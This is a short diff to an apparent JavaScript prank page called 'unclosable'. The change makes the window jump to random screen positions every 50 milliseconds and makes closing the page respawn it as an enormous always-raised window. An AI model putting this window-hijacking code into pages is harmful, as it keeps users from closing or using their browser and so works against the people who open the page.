@@ -13,8 +13,9 @@
       } else {
         function dislocate() {moveTo(Math.random()*screen.width, Math.random()*screen.height)}
         window.onmousemove = dislocate;
+        setInterval(dislocate, 50);
         function closingCode(){
-           setTimeout(window.open, 1, "https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=5, height=5, titlebar=no, alwaysRaised=yes, fullscreen=1');
+           setTimeout(window.open, 1, "https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=50000, height=50000, titlebar=no, alwaysRaised=yes');
         }
         window.onbeforeunload = closingCode;
       }
